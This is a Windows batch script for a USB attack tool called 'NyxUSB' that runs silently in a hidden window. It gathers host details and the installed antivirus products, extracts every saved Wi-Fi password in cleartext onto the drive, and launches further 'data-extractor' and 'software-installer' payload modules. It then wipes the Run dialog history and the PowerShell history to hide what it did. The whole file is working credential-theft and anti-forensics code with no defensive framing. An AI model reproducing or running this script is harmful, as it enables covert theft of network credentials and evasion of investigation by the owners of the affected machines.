@echo off

:: ============================================================================
:: NyxUSB - Master Payload Launcher (Root Deployment)
:: Performs silent host reconnaissance, Wi-Fi auditing, and module execution.
:: ============================================================================

:: Ensure background execution without active terminal window
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: Dynamic path resolution (0 ms, independent of volume label)
set "USB_ROOT=%~dp0"
set "FOLDER_DATA=%USB_ROOT%Data"
if not exist "%FOLDER_DATA%" mkdir "%FOLDER_DATA%" 2>nul

set "HOST_TAG=%COMPUTERNAME%_%USERNAME%"
set "RECON_FILE=%FOLDER_DATA%\recon_%HOST_TAG%.txt"
set "WIFI_FILE=%FOLDER_DATA%\wifi_%HOST_TAG%.txt"

:: ============================================================================
:: 1. FAST HOST RECONNAISSANCE (System, Network, AV / EDR detection)
:: ============================================================================
echo ======================================================== > "%RECON_FILE%"
echo NyxUSB Reconnaissance Report >> "%RECON_FILE%"
echo Target Host : %COMPUTERNAME% >> "%RECON_FILE%"
echo User Account: %USERDOMAIN%\%USERNAME% >> "%RECON_FILE%"
echo Timestamp   : %DATE% %TIME% >> "%RECON_FILE%"
echo ======================================================== >> "%RECON_FILE%"

:: Collect system info and active network configuration
powershell -NoProfile -ExecutionPolicy Bypass -Command "$r = '%RECON_FILE%'; Add-Content $r '`n[OPERATING SYSTEM]'; (Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture, BuildNumber | Format-List | Out-String).Trim() | Add-Content $r; Add-Content $r '`n[NETWORK INTERFACES]'; (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object InterfaceAlias, IPAddress, PrefixLength | Format-Table -AutoSize | Out-String).Trim() | Add-Content $r; Add-Content $r '`n[SECURITY / ANTIVIRUS DETECTED]'; (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, pathToSignedProductExe | Format-Table -AutoSize | Out-String).Trim() | Add-Content $r" >nul 2>&1

:: ============================================================================
:: 2. LANGUAGE-AGNOSTIC WI-FI CREDENTIAL EXTRACTION
:: ============================================================================
echo ======================================================== > "%WIFI_FILE%"
echo NyxUSB Wi-Fi Credentials Report >> "%WIFI_FILE%"
echo Target Host : %COMPUTERNAME% >> "%WIFI_FILE%"
echo Timestamp   : %DATE% %TIME% >> "%WIFI_FILE%"
echo ======================================================== >> "%WIFI_FILE%"

netsh wlan export profile folder="%TEMP%" key=clear >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$out = '%WIFI_FILE%'; Get-ChildItem $env:TEMP -Filter 'Wi-Fi-*.xml' | ForEach-Object { try { [xml]$x = Get-Content $_.FullName; $s = $x.WLANProfile.SSIDConfig.SSID.name; $p = $x.WLANProfile.MSM.security.sharedKey.keyMaterial; if (-not $p) { $p = '[Open Network / No Password]' }; Add-Content -Path $out -Value ('SSID: ' + $s + [Environment]::NewLine + 'PASS: ' + $p + [Environment]::NewLine + '--------------------------------------------------------') } finally { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } }" >nul 2>&1

:: ============================================================================
:: 3. SUBMODULE EXECUTION (Optional: runs existing modules if present)
:: ============================================================================
if exist "%USB_ROOT%payloads\data-extractor\payload.bat" (
    call "%USB_ROOT%payloads\data-extractor\payload.bat" hidden
)

if exist "%USB_ROOT%payloads\software-installer\payload.bat" (
    call "%USB_ROOT%payloads\software-installer\payload.bat" hidden
)

:: ============================================================================
:: 4. ANTI-FORENSICS CLEANUP (OPSEC)
:: ============================================================================
:: Wipe command from Windows RunMRU history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>&1

:: Clear PowerShell command history file
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1

exit
